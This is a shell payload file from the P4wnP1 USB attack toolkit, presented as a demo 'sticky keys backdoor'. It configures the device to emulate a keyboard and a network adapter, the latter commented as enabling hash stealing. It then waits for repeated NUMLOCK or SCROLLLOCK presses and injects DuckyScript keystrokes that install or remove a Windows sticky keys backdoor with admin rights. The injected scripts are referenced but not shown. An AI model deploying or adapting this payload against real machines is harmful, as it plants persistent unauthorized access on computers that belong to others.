#    This file is part of P4wnP1.
#
#    Copyright (c) 2017, Marcus Mengs. 
#
#    P4wnP1 is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    P4wnP1 is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.



# P4wnP1 demo payload by MaMe82
# ==========================
#
# Sticky keys backdoor
# - needs Admin privs
# - multiple presses to NUMLOCK enable backdoor
# - multiple presses to SCROLLLOCK disable backdoor
#
# Note: RNDIS is enabled for this payload in order to be able to get SSH access
#       but this isn't needed for the payload to work. In fact it should be disabled to shorten the needed time
#       for Windows driver installation (don't forget to change the USB_PID if RNDIS is disabled, to force driver reinstall on Windows)

USB_VID="0x1d6b"    # Vendor ID
USB_PID="0x1004"    # Product ID
USE_ECM=false       # we need no Linux/Mac networking
USE_RNDIS=true      # RNDIS network device to enable hash stealing
USE_HID=true        # HID keyboard to allow entering cracked password
USE_UMS=false # enable USB Mass Storage

lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET or remove this line to use the setting from setup.cfg

function onKeyboardUp()
{


	while $true; do
                # Wait for keyboard trigger based on LED detection
                # NUMLOCK, CAPSLOCK or SCROLLLOCK have to be pressed 6 times frequently (max 800ms between presses)
                # in order to make the blocking 'key_trigger' command return
                #
                # key_trigger returns an exitcode representing the key (status LED) which has triggered
                key_trigger

                case "$?" in
                        2)  cat $wdir/DuckyScripts/stickykey.duck | duckhid
                            led_blink 1;;
                        3)  cat $wdir/DuckyScripts/stickykey_remove.duck | duckhid
                            led_blink 2;;
                esac
	done

}


